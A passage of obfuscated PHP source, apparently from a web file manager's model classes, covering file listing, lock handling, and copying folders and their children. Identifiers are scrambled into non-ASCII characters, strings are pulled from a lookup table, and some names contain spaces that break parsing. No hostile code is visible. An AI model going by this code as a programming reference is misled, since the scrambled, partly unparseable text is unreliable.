($¹æ°š»£[$ÒÛÍÁá[180]] == self::TYPE_GROUP) { $ªÁ—™¿ = Model($ÒÛÍÁá[557])->getInfoSimple($¹æ°š»£[$ÒÛÍÁá[541]]); $‡à£ÒÀ = $ªÁ—™¿[$ÒÛÍÁá[32]]; } else { if ($¹æ°š»£[$ÒÛÍÁá[180]] == self::TYPE_SYSTEM) { $‡à£ÒÀ = $ÒÛÍÁá[577]; } } } $‡à£ÒÀ = $‡à£ÒÀ ? $ÒÛÍÁá[8] . $‡à£ÒÀ . $ÒÛÍÁá[8] : $ÒÛÍÁá[8]; return $‡à£ÒÀ; } protected function _listAppendUser(&$Ó€…¿¹ù) { $ÔìİıÔ =& $_SERVER[èùÙ¹Ïö]; $öú±Õ„é = array_to_keyvalue($Ó€…¿¹ù, $ÔìİıÔ[12], $ÔìİıÔ[497]); $¤ˆ†ÏÏ = array_to_keyvalue($Ó€…¿¹ù, $ÔìİıÔ[12], $ÔìİıÔ[499]); $„²Ú»à = array_merge($öú±Õ„é, $¤ˆ†ÏÏ); $É…ƒäÍ = Model($ÔìİıÔ[570])->userListInfo($„²Ú»à); foreach ($Ó€…¿¹ù as &$¯«øüÑ) { $ììƒÏÁó = $¯«øüÑ[$ÔìİıÔ[497]]; $¯«øüÑ[$ÔìİıÔ[497]] = $É…ƒäÍ[$ììƒÏÁó] ? $É…ƒäÍ[$ììƒÏÁó] : !1; $ììƒÏÁó = $¯«øüÑ[$ÔìİıÔ[499]]; $¯«øüÑ[$ÔìİıÔ[499]] = $É…ƒäÍ[$ììƒÏÁó] ? $É…ƒäÍ[$ììƒÏÁó] : !1; if (isset($¯«øüÑ[$ÔìİıÔ[509]]) && $¯«øüÑ[$ÔìİıÔ[509]][$ÔìİıÔ[578]]) { $ñ‰çğ¦Õ = $GLOBALS[$ÔìİıÔ[6]][$ÔìİıÔ[91]][$ÔìİıÔ[579]]; if ($¯«øüÑ[$ÔìİıÔ[509]][$ÔìİıÔ[580]] <= time() - $ñ‰çğ¦Õ) { $this->metaSet($¯«øüÑ[$ÔìİıÔ[183]], $ÔìİıÔ[578], null); $this->metaSet($¯«øüÑ[$ÔìİıÔ[183]], $ÔìİıÔ[580], null); unset($¯«øüÑ[$ÔìİıÔ[509]][$ÔìİıÔ[578]]); continue; } $Õ—±ÖÕâ = $¯«øüÑ[$ÔìİıÔ[509]][$ÔìİıÔ[578]]; $¯«øüÑ[$ÔìİıÔ[509]][$ÔìİıÔ[581]] = Model($ÔìİıÔ[570])->getInfoSimpleOuter($Õ—±ÖÕâ); } } unset($¯«øüÑ); } public function parentLevelArray($¼”ùè•Õ) { $ı¶ÒÔ¾ =& $_SERVER[èùÙ¹Ïö]; $¼”ùè•Õ = explode($ı¶ÒÔ¾[50], trim($¼”ùè•Õ, $ı¶ÒÔ¾[50])); return array_remove_value($¼”ùè•Õ, $ı¶ÒÔ¾[214]); } public function listAll($ÙÀ¬ĞÔ) { $±˜áÃ İ =& $_SERVER[èùÙ¹Ïö]; $Ñ÷»¨Œ = $this->sourceInfo($ÙÀ¬ĞÔ); $–Õœ¥Âš = array($±˜áÃ İ[582] => array($±˜áÃ İ[583], $Ñ÷»¨Œ[$±˜áÃ İ[556]] . $ÙÀ¬ĞÔ . $±˜áÃ İ[584]), $±˜áÃ İ[585] => 0); $Çşùì¡ = $±˜áÃ İ[586]; $Ï¯ãû‡« = "\x4c\x45\106\x54\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\x65\40\146\x69\154\x65\40\157\x6e\40\163\x6f\165\x72\143\145\x2e\x66\x69\x6c\145\111\104\40\75\40\x66\x69\154\x65\x2e\146\x69\154\x65\111\104"; $¹“¶šÏõ = $this->alias($±˜áÃ İ[489])->field($Çşùì¡)->where($–Õœ¥Âš)->join($Ï¯ãû‡«)->select(); $this->_listAppendAuth($¹“¶šÏõ); $this->_listAppendUser($¹“¶šÏõ); $this->_listAppendPath($¹“¶šÏõ); $¹“¶šÏõ = array_to_keyvalue($¹“¶šÏõ, $±˜áÃ İ[183]); $°´Û¨ä = "\x2f{$Ñ÷»¨Œ[$±˜áÃ İ[32]]}\57"; $°´Û¨ä = $°´Û¨ä == $±˜áÃ İ[564] ? $±˜áÃ İ[8] : $°´Û¨ä; $ú·İŠ“© = array(); foreach ($¹“¶šÏõ as $ñ·×’– => $éÌäè²æ) { $“ÛáÓ = $this->parentLevelArray($éÌäè²æ[$±˜áÃ İ[556]]); array_shift($“ÛáÓ); $§Î†İÂ = $°´Û¨ä; for ($Ëï¬ğ¾à = 0; $Ëï¬ğ¾à < count($“ÛáÓ); $Ëï¬ğ¾à++) { $§Î†İÂ .= $¹“¶šÏõ[$“ÛáÓ[$Ëï¬ğ¾à]][$±˜áÃ İ[32]] . $±˜áÃ İ[8]; } $§Î†İÂ .= $éÌäè²æ[$±˜áÃ İ[32]]; if ($éÌäè²æ[$±˜áÃ İ[455]]) { $§Î†İÂ .= $±˜áÃ İ[8]; } $Ÿœ¿·ìİ = array($±˜áÃ İ[465] => str_replace($±˜áÃ İ[564], $±˜áÃ İ[8], str_replace($±˜áÃ İ[564], $±˜áÃ İ[8], str_replace($±˜áÃ İ[564], $±˜áÃ İ[8], $§Î†İÂ))), $±˜áÃ İ[587] => intval($éÌäè²æ[$±˜áÃ İ[455]]), $±˜áÃ İ[588] => intval($éÌäè²æ[$±˜áÃ İ[78]]), $±˜áÃ İ[87] => intval($éÌäè²æ[$±˜áÃ İ[87]]), $±˜áÃ İ[89] => $this->pathInfoFilter($éÌäè²æ)); if (!$Ÿœ¿·ìİ[$±˜áÃ İ[455]]) { $Ÿœ¿·ìİ[$±˜áÃ İ[511]] = $éÌäè²æ[$±˜áÃ İ[511]]; } $ú·İŠ“©[] = $Ÿœ¿·ìİ; } $ú·İŠ“© = array_sort_by($ú·İŠ“©, $±˜áÃ İ[86]); return $ú·İŠ“©; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÕîèÒÒİ) { $›‚Œºìœ =& $_SERVER[èùÙ¹Ïö]; if (!$this->allowLock()) { return; } $this->_lockCheck($›‚Œºìœ[589], $ÕîèÒÒİ); $ŒĞò¢•¾ = 1; $this->_lockEvent($ÕîèÒÒİ, array($›‚Œºìœ[590], $›‚Œºìœ[591]), $ŒĞò¢•¾); $this->_lockParent($ÕîèÒÒİ, array($›‚Œºìœ[591]), $ŒĞò¢•¾); $this->_lockEvent($ÕîèÒÒİ, array($›‚Œºìœ[592], $›‚Œºìœ[593]), $ŒĞò¢•¾); $this->_lockCheckEnd($›‚Œºìœ[589], $ÕîèÒÒİ); } public function lockCopyEnd($¸ºíü) { $ä†¾ı³ú =& $_SERVER[èùÙ¹Ïö]; if (!$this->allowLock()) { return; } $“àÌµ•ë = 0; $this->_lockEvent($¸ºíü, array($ä†¾ı³ú[590], $ä†¾ı³ú[591]), $“àÌµ•ë); $this->_lockParent($¸ºíü, array($ä†¾ı³ú[591]), $“àÌµ•ë); $this->_lockEvent($¸ºíü, array($ä†¾ı³ú[592], $ä†¾ı³ú[593]), $“àÌµ•ë); } public function lockWriteStart($ü°†Úóõ, $†Õ–ù„ó = '') { $’¤‰ÀÊŒ =& $_SERVER[èùÙ¹Ïö]; if (!$this->allowLock()) { return; } $this->_lockCheck($’¤‰ÀÊŒ[590], $ü°†Úóõ); $œãÏ½‰í = 1; $this->_lockKey($’¤‰ÀÊŒ[594] . $ü°†Úóõ . $’¤‰ÀÊŒ[10] . $†Õ–ù„ó, $œãÏ½‰í); $this->_lockEvent($ü°†Úóõ, array($’¤‰ÀÊŒ[589], $’¤‰ÀÊŒ[591]), $œãÏ½‰í); $this->_lockParent($ü°†Úóõ, array($’¤‰ÀÊŒ[589], $’¤‰ÀÊŒ[591]), $œãÏ½‰í); $this->_lockCheckEnd($’¤‰ÀÊŒ[590], $ü°†Úóõ); } public function lockWriteEnd($ñ«’‚Îë, $ªğÔ“Ÿœ = '') { $î¾¼«§ =& $_SERVER[èùÙ¹Ïö]; if (!$this->allowLock()) { return; } $äĞ§ì´ƒ = 0; $this->_lockKey($î¾¼«§[594] . $ñ«’‚Îë . $î¾¼«§[10] . $ªğÔ“Ÿœ, $äĞ§ì´ƒ); $this->_lockEvent($ñ«’‚Îë, array($î¾¼«§[589], $î¾¼«§[591]), $äĞ§ì´ƒ); $this->_lockParent($ñ«’‚Îë, array($î¾¼«§[589], $î¾¼«§[591]), $äĞ§ì´ƒ); } public function lockMoveStart($ëèÔ’°·) { $Ğ´Ô˜Ş‡ =& $_SERVER[èùÙ¹Ïö]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ğ´Ô˜Ş‡[591], $ëèÔ’°·); $Î›ÍÂ®÷ = 1; $this->_lockKey($Ğ´Ô˜Ş‡[595] . $ëèÔ’°·, $Î›ÍÂ®÷); $this->_lockEvent($ëèÔ’°·, array($Ğ´Ô˜Ş‡[589], $Ğ´Ô˜Ş‡[590]), $Î›ÍÂ®÷); $this->_lockParent($ëèÔ’°·, array($Ğ´Ô˜Ş‡[589], $Ğ´Ô˜Ş‡[591]), $Î›ÍÂ®÷); $this->_lockEvent($ëèÔ’°·, array($Ğ´Ô˜Ş‡[596], $Ğ´Ô˜Ş‡[592], $Ğ´Ô˜Ş‡[593]), $Î›ÍÂ®÷); $this->_lockCheckEnd($Ğ´Ô˜Ş‡[591], $ëèÔ’°·); } public function lockMoveEnd($ƒÑƒÉıü) { $›ŠÖ¥¾Ú =& $_SERVER[èùÙ¹Ïö]; if (!$this->allowLock()) { return; } $‹‚üÀùå = 0; $this->_lockKey($›ŠÖ¥¾Ú[595] . $ƒÑƒÉıü, $‹‚üÀùå); $this->_lockEvent($ƒÑƒÉıü, array($›ŠÖ¥¾Ú[589], $›ŠÖ¥¾Ú[590]), $‹‚üÀùå); $this->_lockParent($ƒÑƒÉıü, array($›ŠÖ¥¾Ú[589], $›ŠÖ¥¾Ú[591]), $‹‚üÀùå); $this->_lockEvent($ƒÑƒÉıü, array($›ŠÖ¥¾Ú[596], $›ŠÖ¥¾Ú[592], $›ŠÖ¥¾Ú[593]), $‹‚üÀùå); } private function _lockCheck($î…„°¿µ, $ïËı¬ş‚) { $£¸İâŒØ =& $_SERVER[èùÙ¹Ïö]; $­Õˆ‘Ñ = $this->sourceInfo($ïËı¬ş‚); $½œ¡Øâ£ = $î…„°¿µ . $£¸İâŒØ[10] . $ïËı¬ş‚; $this->_lockTimeStart[$½œ¡Øâ£] = timeFloat(); if (!is_array($­Õˆ‘Ñ)) { return; } $¨Êƒ°š† = LNG($£¸İâŒØ[597]); CacheLock::setErrorMsg($£¸İâŒØ[165] . htmlspecialchars($­Õˆ‘Ñ[$£¸İâŒØ[32]]) . $£¸İâŒØ[167] . $¨Êƒ°š†); $this->_lockKey($½œ¡Øâ£, 1); $this->_lockKey($½œ¡Øâ£, 0); $ÛÏ‰ÈÖÅ = array_reverse($this->parentLevelArray($­Õˆ‘Ñ[$£¸İâŒØ[556]])); foreach ($ÛÏ‰ÈÖÅ as $ß×Œûã…) { $½œ¡Øâ£ = $î…„°¿µ . $£¸İâŒØ[598] . $ß×Œûã…; if (CacheLock::lockGet($£¸İâŒØ[599] . $½œ¡Øâ£)) { $­Õˆ‘Ñ = $this->sourceInfo($ß×Œûã…); CacheLock::setErrorMsg($£¸İâŒØ[165] . htmlspecialchars($­Õˆ‘Ñ[$£¸İâŒØ[32]]) . $£¸İâŒØ[167] . $¨Êƒ°š†); $this->_lockKey($½œ¡Øâ£, 1); $this->_lockKey($½œ¡Øâ£, 0); } } } private function _lockCheckEnd($ú–•ß¯¤, $½ï‹ÇÎñ) { $›ñ–€¶Å =& $_SERVER[èùÙ¹Ïö]; $¶œôŒŸñ = $ú–•ß¯¤ . $›ñ–€¶Å[10] . $½ï‹ÇÎñ; CacheLock::setErrorMsg($›ñ–€¶Å[424]); if (!isset($this->_lockTimeStart[$¶œôŒŸñ])) { return; } $­ç¼Ôşê = timeFloat() - $this->_lockTimeStart[$¶œôŒŸñ]; unset($this->_lockTimeStart[$¶œôŒŸñ]); if ($­ç¼Ôşê > 0.5) { unset(self::$cacheSourceInfo[$›ñ–€¶Å[503] . $½ï‹ÇÎñ]); } $«¯•ˆ¡š = $this->sourceInfo($½ï‹ÇÎñ); if (!$«¯•ˆ¡š) { show_json(LNG($›ñ–€¶Å[107]), !1); } } private function _lockParent($îÀó¦´ì, $µê¿–÷, $ëÛùÅ¦) { if (!$this->autoLockSet) { return; } $Í“œˆÒ = $this->sourceInfo($îÀó¦´ì); if (!is_array($Í“œˆÒ)) { return; } $íÙ»Ü…¢ = array_reverse($this->parentLevelArray($Í“œˆÒ[$_SERVER[èùÙ¹Ïö][556]])); foreach ($íÙ»Ü…¢ as $‰ Ô˜èò) { $this->_lockEvent($‰ Ô˜èò, $µê¿–÷, $ëÛùÅ¦); } } private function _lockEvent($ŠÈƒ‹‘Ç, $´œËë…µ, $Î¸ª­ÕÙ) { $­‹®ªÎ¹ =& $_SERVER[èùÙ¹Ïö]; if (!$this->autoLockSet) { return; } foreach ($´œËë…µ as $Å‰¶×€¥) { $ˆÂÏ½Ûè = $Å‰¶×€¥ . $­‹®ªÎ¹[10] . $ŠÈƒ‹‘Ç; if ($Î¸ª­ÕÙ && CacheLock::lockGet($­‹®ªÎ¹[599] . $ˆÂÏ½Ûè)) { continue; } $this->_lockKey($ˆÂÏ½Ûè, $Î¸ª­ÕÙ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($êñÕ·Ã†, $üó‚€Ã = 1) { $úà¡Œ¡« = $_SERVER[èùÙ¹Ïö][599] . md5($êñÕ·Ã†); if ($üó‚€Ã) { if (isset(self::$_lockItemArr[$úà¡Œ¡«])) { return; } self::$_lockItemArr[$úà¡Œ¡«] = 1; CacheLock::lock($úà¡Œ¡«, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$úà¡Œ¡«])) { return; } unset(self::$_lockItemArr[$úà¡Œ¡«]); CacheLock::unlock($úà¡Œ¡«); } } public function isParentOf($ˆºçã, $ÃÄ¯±ÙÓ) { $ûĞş’ÛĞ =& $_SERVER[èùÙ¹Ïö]; $¢½ç·¿• = $this->sourceInfo($ˆºçã); $¡ïúıºÑ = $this->sourceInfo($ÃÄ¯±ÙÓ); $Ó®‹²¸ = $¢½ç·¿•[$ûĞş’ÛĞ[556]] . $¢½ç·¿•[$ûĞş’ÛĞ[183]] . $ûĞş’ÛĞ[50]; $×î‹¢Ÿ‚ = $¡ïúıºÑ[$ûĞş’ÛĞ[556]] . $¡ïúıºÑ[$ûĞş’ÛĞ[183]] . $ûĞş’ÛĞ[50]; $—ëù‘•€ = strpos($×î‹¢Ÿ‚, $Ó®‹²¸) === 0; return $—ëù‘•€; } private $targetIsDelete = 0; public function copy($Æş€‘ëË, $Ïø÷»Ïú, $ÄÅÆÓşÄ = REPEAT_REPLACE, $ÎòÔ•î¡ = '') { $‡¼Ôå®¸ =& $_SERVER[èùÙ¹Ïö]; $ß¬‘ËéŠ = $this->sourceInfo($Æş€‘ëË); $’ò‡ĞŠ = $this->sourceInfo($Ïø÷»Ïú); if (!$ß¬‘ËéŠ || !$’ò‡ĞŠ || $’ò‡ĞŠ[$‡¼Ôå®¸[455]] != $‡¼Ôå®¸[90]) { return !1; } if ($this->isParentOf($Æş€‘ëË, $Ïø÷»Ïú)) { return !1; } $Æşìé£Ë = $ÎòÔ•î¡ ? $ÎòÔ•î¡ : $ß¬‘ËéŠ[$‡¼Ôå®¸[32]]; $this->lockCopyStart($Æş€‘ëË); $this->lockWriteStart($Ïø÷»Ïú, $Æşìé£Ë); $¢ØóÊ¹¬ = array($‡¼Ôå®¸[600] => array(), $‡¼Ôå®¸[601] => array(), $‡¼Ôå®¸[602] => array()); $this->targetIsDelete = intval($ß¬‘ËéŠ[$‡¼Ôå®¸[475]]); $¹æ¬É„ = $this->fileNameExistAuto($Ïø÷»Ïú, $ß¬‘ËéŠ); $µ²ˆ×§ª = $this->_copy($Æş€‘ëË, $Ïø÷»Ïú, $ÄÅÆÓşÄ, $¢ØóÊ¹¬, !0, $ÎòÔ•î¡); $this->_childrenListClear(); $this->lockCopyEnd($Æş€‘ëË); $this->lockWriteEnd($Ïø÷»Ïú, $Æşìé£Ë); if ($ß¬‘ËéŠ[$‡¼Ôå®¸[455]] == $‡¼Ôå®¸[90] && $¹æ¬É„ == $µ²ˆ×§ª) { $this->folderSizeResetChildren($¹æ¬É„); } Model($‡¼Ôå®¸[603])->addAll($¢ØóÊ¹¬[$‡¼Ôå®¸[601]], array(), !0); if ($¹æ¬É„ != $µ²ˆ×§ª || $ß¬‘ËéŠ[$‡¼Ôå®¸[455]] == $‡¼Ôå®¸[90]) { Model($‡¼Ôå®¸[604])->eventCopy($µ²ˆ×§ª); } $this->saveAll($¢ØóÊ¹¬[$‡¼Ôå®¸[602]]); Model($‡¼Ôå®¸[216])->linkAdd($¢ØóÊ¹¬[$‡¼Ôå®¸[600]]); $this->folderSizeReset($Ïø÷»Ïú); $this->updateModifyTime($Ïø÷»Ïú); return $µ²ˆ×§ª; } private function _copy($¼¤”©Ãâ, $ñìÍá•, $¼Ãë¿»¤, &$¬£ØÚÔ, $»º²†Ù¬, $ªóŠŒõ¶ = '') { $êøÜöë‡ =& $_SERVER[èùÙ¹Ïö]; $™ÃóÛ“Ÿ = $this->sourceInfoCache($¼¤”©Ãâ); $Ç¢×ôª = $™ÃóÛ“Ÿ[$êøÜöë‡[455]] == $êøÜöë‡[90]; $Š÷Ôı¡ = $ªóŠŒõ¶ ? $ªóŠŒõ¶ : $™ÃóÛ“Ÿ[$êøÜöë‡[32]]; $„»÷ê–½ = $this->fileNameExistAuto($ñìÍá•, $™ÃóÛ“Ÿ); if ($»º²†Ù¬) { $this->_childrenAllMake($¼¤”©Ãâ); if ($Ç¢×ôª && $„»÷ê–½) { $this->_childrenAllMake($„»÷ê–½); } } if (!$„»÷ê–½) { return $this->_copyCreate($¼¤”©Ãâ, $ñìÍá•, $Š÷Ôı¡, $¬£ØÚÔ); } $í¿ûÛ¡œ = $„»÷ê–½; if ($Ç¢×ôª) { if ($¼Ãë¿»¤ == REPEAT_RENAME_FOLDER) { $Š÷Ôı¡ = $this->fileNameAutoCache($ñìÍá•, $Š÷Ôı¡, $¼Ãë¿»¤, $Ç¢×ôª); $í¿ûÛ¡œ = $this->_copyCreate($¼¤”©Ãâ, $ñìÍá•, $Š÷Ôı¡, $¬£ØÚÔ); } else { $ôŒ½›²¡ = $this->_childrenList($¼¤”©Ãâ); foreach ($ôŒ½›²¡ as $¿‘«—´å) { $this->_copy($¿‘«—´å[$êøÜöë‡[183]], $„»÷ê–½, $¼Ãë¿»¤, $¬£ØÚÔ, !1); } } } else { if ($¼Ãë¿»¤ == REPEAT_RENAME || $¼Ãë¿»¤ == REPEAT_RENAME_FOLDER) { $Š÷Ôı¡ = $this->fileNameAutoCache($ñìÍá•, $Š÷Ôı¡, $¼Ãë¿»¤, $Ç¢×ôª); $í¿ûÛ¡œ = $this->_copyCreate($¼¤”©Ãâ, $ñìÍá•, $Š÷Ôı¡, $¬£ØÚÔ); } else { if ($¼Ãë¿»¤ == REPEAT_REPLACE) { $°Âİ€Éœ = $this->sourceInfoCache($„»÷ê–½); $”¡ãîõš = $this->fileHistory($°Âİ€Éœ, $™ÃóÛ“Ÿ[$êøÜöë‡[511]], $™ÃóÛ“Ÿ[$êøÜöë‡[78]]); if ($”¡ãîõš) { $¬£ØÚÔ[$êøÜöë‡[600]][] = $™ÃóÛ“Ÿ[$êøÜöë‡[511]]; } } else { if ($¼Ãë¿»¤ == REPEAT_SKIP) { } } } Hook::trigger($êøÜöë‡[605], array($êøÜöë‡[606], $™ÃóÛ“Ÿ, 0)); } return $í¿ûÛ¡œ; } private function _copyCreate($å•ĞÚ˜, $¼×î®ª, $ÙÌŠŠè“, &$Ø´Ë˜Ê) { $ÓËóµŒ =& $_SERVER[èùÙ¹Ïö]; $Ê³ã½Î = $this->sourceInfoCache($å•ĞÚ˜); $¢°éß¨î = $this->sourceInfoCache($¼×î®ª); $·­âë‚­ = $this->_makeItemData($Ê³ã½Î, $¢°éß¨î, $ÙÌŠŠè“); Hook::trigger($ÓËóµŒ[607], $·­âë‚­); Hook::trigger($ÓËóµŒ[608], array($ÓËóµŒ[609], $·­âë‚­, 0)); $Õ®ÜÒ¿À = $this->add($·­âë‚­); $„•Í´Ä» = array($ÓËóµŒ[183] => $Õ®ÜÒ¿À, $ÓËóµŒ[32] => $ÙÌŠŠè“); $this->_copyApplyMeta($„•Í´Ä», $Ø´Ë˜Ê); if ($Ê³ã½Î[$ÓËóµŒ[455]] != $ÓËóµŒ[90]) { $Ø´Ë˜Ê[$ÓËóµŒ[600]][] = $Ê³ã½Î[$ÓËóµŒ[511]]; return $Õ®ÜÒ¿À; } $ƒ¹¼Ñ‡ = array(); $¶ƒİ©ğ = array(); $this->_childrenListAll($å•ĞÚ˜, $ƒ¹¼Ñ‡); $ö¿¿¸ìÖ = count($ƒ¹¼Ñ‡); if ($ö¿¿¸ìÖ == 0) { return $Õ®ÜÒ¿À; } $ø´Ëô¡‡ = $this->sourceInfo($Õ®ÜÒ¿À); foreach ($ƒ¹¼Ñ‡ as $í¸ÓÕ‚„) { $ÒÍ†›Œ™ = $this->_makeItemData($í¸ÓÕ‚„, $ø´Ëô¡‡, $í¸ÓÕ‚„[$ÓËóµŒ[32]]); $ÒÍ†›Œ™[$ÓËóµŒ[556]] = $í¸ÓÕ‚„[$ÓËóµŒ[556]]; $¶ƒİ©ğ[] = $ÒÍ†›Œ™; } $this->chunkEventSet($ÓËóµŒ[610], array($ÓËóµŒ[611], $·­âë‚­, $ö¿¿¸ìÖ)); $this->addAll($¶ƒİ©ğ, array(), !1); $¯úÔË± = $this->where(array($ÓËóµŒ[182] => $Õ®ÜÒ¿À))->select(); $†°ÉİÉŸ = $this->_childrenMakeRelation($ƒ¹¼Ñ‡, $¯úÔË±); $†°ÉİÉŸ[$å•ĞÚ˜] = $Õ®ÜÒ¿À; $úŞÍÉô = array(); $ŸğŸí³Û = array(); foreach ($¯úÔË± as $í¸ÓÕ‚„) { $×»ÔÑÅÌ = $í¸ÓÕ‚„[$ÓËóµŒ[183]]; $È÷îÁß³ = $this->_childrenMatch($†°ÉİÉŸ, $í¸ÓÕ‚„, $ø´Ëô¡‡); $úŞÍÉô[] = array($ÓËóµŒ[183], $×»ÔÑÅÌ, $ÓËóµŒ[182], $È÷îÁß³[$ÓËóµŒ[182]]); $ŸğŸí³Û[] = array($ÓËóµŒ[183], $×»ÔÑÅÌ, $ÓËóµŒ[556], $È÷îÁß³[$ÓËóµŒ[556]]); $this->_copyApplyMeta($í¸ÓÕ‚„, $Ø´Ë˜Ê); if ($í¸ÓÕ‚„[$ÓËóµŒ[455]] != $ÓËóµŒ[90]) { $Ø´Ë˜Ê[$ÓËóµŒ[600]][] = $í¸ÓÕ‚„[$ÓËóµŒ[511]]; } } $this->chunkEventSet($ÓËóµŒ[612], array($ÓËóµŒ[613], $·­âë‚­, $ö¿¿¸ìÖ)); $this->saveAll($úŞÍÉô); $this->chunkEventSet($ÓËóµŒ[614], array($ÓËóµŒ[615], $·­âë‚­, $ö¿¿¸ìÖ)); $this->saveAll($ŸğŸí³Û); return $Õ®ÜÒ¿À; } private function _childrenMakeRelation($î”©ìëÁ, $§Õ°Çœº) { $†±û¥¶ù =& $_SERVER[èùÙ¹Ïö]; $È¬õô§î = array(); $¸ä ´‘ = array(); foreach ($î”©ìëÁ as $ë×»®È­) { $¶âåùç = $ë×»®È­[$†±û¥¶ù[32]] . $†±û¥¶ù[8] . $ë×»®È­[$†±û¥¶ù[556]]; $È¬õô§î[$¶âåùç] = $ë×»®È­[$†±û¥¶ù[183]]; } foreach ($§Õ°Çœº as $ë×»®È­) { $¶âåùç = $ë×»®È­[$†±û¥¶ù[32]] . $†±û¥¶ù[8] . $ë×»®È­[$†±û¥¶ù[556]]; $æŸñÔú = $È¬õô§î[$¶âåùç]; $¸ä ´‘[$æŸñÔú] = $ë×»®È­[$†±û¥¶ù[183]]; } return $¸ä ´‘; } private function _childrenMatch($ã˜­˜à, $¼ÖÓí€é, $ºá×çÁ) { $çåÓ­ƒÜ =& $_SERVER[èùÙ¹Ïö]; $áÃß¶®£ = $ºá×çÁ[$çåÓ­ƒÜ[556]]; $¬‚ùÚâ = $this->parentLevelArray($¼ÖÓí€é[$çåÓ­ƒÜ[556]]); foreach ($¬‚ùÚâ as $ÒÚÒÎ†Ó) { if (isset($ã˜­˜à[$ÒÚÒÎ†Ó])) { $áÃß¶®£ .= $ã˜­˜à[$ÒÚÒÎ†Ó] . $çåÓ­ƒÜ[616]; } } $áÃß¶®£ = rtrim($áÃß¶®£, $çåÓ­ƒÜ[50]) . $çåÓ­ƒÜ[50]; $°®Ò×–ø = $this->parentLevelArray($áÃß¶®£); $ä¸š¬ƒ = $°®Ò×–ø[count($°®Ò×–ø) - 1]; return array($çåÓ­ƒÜ[182] => $ä¸š¬ƒ, $çåÓ­ƒÜ[556] => $áÃß¶®£); } private function _makeItemData($¥òÛÚ, $¤‹Ü­ñß, $«Í¹à) { $ëû¦åÈì =& $_SERVER[èùÙ¹Ïö]; $†Ø§Ùì® = array($ëû¦åÈì[617] => $¥òÛÚ[$ëû¦åÈì[455]], $ëû¦åÈì[464] => $«Í¹à, $ëû¦åÈì[618] => $¥òÛÚ[$ëû¦åÈì[456]] ? $¥òÛÚ[$ëû¦åÈì[456]] : $ëû¦åÈì[12], $ëû¦åÈì[512] => $¥òÛÚ[$ëû¦åÈì[511]] ? $¥òÛÚ[$ëû¦åÈì[511]] : 0, $ëû¦åÈì[588] => $¥òÛÚ[$ëû¦åÈì[78]] ? $¥òÛÚ[$ëû¦åÈì[78]] : 0, $ëû¦åÈì[619] => intval($¤‹Ü­ñß[$ëû¦åÈì[180]]), $ëû¦åÈì[620] => intval($¤‹Ü­ñß[$ëû¦åÈì[541]]), $ëû¦åÈì[621] => intval(USER_ID), $ëû¦åÈì[622] => intval(USER_ID), $ëû¦åÈì[447] => intval($¤‹Ü­ñß[$ëû¦åÈì[183]]), $ëû¦åÈì[623] => $¤‹Ü­ñß[$ëû¦åÈì[556]] . $¤‹Ü­ñß[$ëû¦åÈì[183]] . $ëû¦åÈì[50], $ëû¦åÈì[468] => $¥òÛÚ[$ëû¦åÈì[87]] ? $¥òÛÚ[$ëû¦åÈì[87]] : time(), $ëû¦åÈì[474] => 0, $ëû¦åÈì[624] => $ëû¦åÈì[12]); return $†Ø§Ùì®; } private function _copyApplyMeta($óóÄªäÊ, &$ï£«½Ø) { $öÙä– Ó =& $_SERVER[èùÙ¹Ïö]; $ƒ‹ëäèÎ = $óóÄªäÊ[$öÙä– Ó[183]]; $™‹»º = $óóÄªäÊ[$öÙä– Ó[32]]; if (!isset($óóÄªäÊ[$öÙä– Ó[625]]) || !$óóÄªäÊ[$öÙä– Ó[625]] || $óóÄªäÊ[$öÙä– Ó[625]] == $öÙä– Ó[214]) { $ï£«½Ø[$öÙä– Ó[602]][] = array($öÙä– Ó[183], $ƒ‹ëäèÎ, $öÙä– Ó[625], short_id($ƒ‹ëäèÎ)); } if (Input::check($™‹»º, $öÙä– Ó[626])) { $ï£«½Ø[$öÙä– Ó[601]][] = array($öÙä– Ó[183] => $ƒ‹ëäèÎ, $öÙä– Ó[96] => $öÙä– Ó[508], $öÙä– Ó[420] => str_replace($öÙä– Ó[53], $öÙä– Ó[12], Pinyin::get($™‹»º))); $ï£«½Ø[$öÙä– Ó[601]][] = array($öÙä– Ó[183] => $ƒ‹ëäèÎ, $öÙä– Ó[96] => $öÙä– Ó[507], $öÙä– Ó[420] => Pinyin::get($™‹»º, $öÙä– Ó[627])); } $ï£«½Ø[$öÙä– Ó[601]][] = array($öÙä– Ó[183] => $ƒ‹ëäèÎ, $öÙä– Ó[96] => $öÙä– Ó[487], $öÙä– Ó[420] => KodSort::makeStr($™‹»º)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÉâÔæşã) { $Äà÷¤Ÿš =& $_SERVER[èùÙ¹Ïö]; $—ù®§¾˜ = $this->sourceInfo($ÉâÔæşã); $œí¦ÅÍ = $Äà÷¤Ÿš[628]; $æ¯§ÅÈ¬ = array($Äà÷¤Ÿš[556] => array($Äà÷¤Ÿš[583], $—ù®§¾˜[$Äà÷¤Ÿš[556]] . $ÉâÔæşã . $Äà÷¤Ÿš[584]), $Äà÷¤Ÿš[475] => $this->targetIsDelete); $‰ãÉİÓŒ = $this->field($œí¦ÅÍ)->where($æ¯§ÅÈ¬)->select(); if (!$‰ãÉİÓŒ) { return; } $‰ãÉİÓŒ = array_to_keyvalue($‰ãÉİÓŒ, $Äà÷¤Ÿš[183]); foreach ($‰ãÉİÓŒ as $Ï£Ôôó) { $×ñÃ´ó = $Ï£Ôôó[$Äà÷¤Ÿš[182]]; $ÉâÔæşã = $Ï£Ôôó[$Äà÷¤Ÿš[183]]; if (!isset($this->_childrenListCache[$ÉâÔæşã]) && $Ï£Ôôó[$Äà÷¤Ÿš[455]] == $Äà÷¤Ÿš[90]) { $this->_childrenListCache[$ÉâÔæşã] = array(); } if (!isset($this->_childrenListCache[$×ñÃ´ó])) { $this->_childrenListCache[$×ñÃ´ó] = array(); } $this->_childrenListCache[$×ñÃ´ó][$ÉâÔæşã] = $Ï£Ôôó; $this->_childrenItemCache[$ÉâÔæşã] = $Ï£Ôôó; } } private function _childrenListAll($¤ÊÉ¥ §, &$ñ£ó»ÀÔ) { $ò°‰ıŠÄ =& 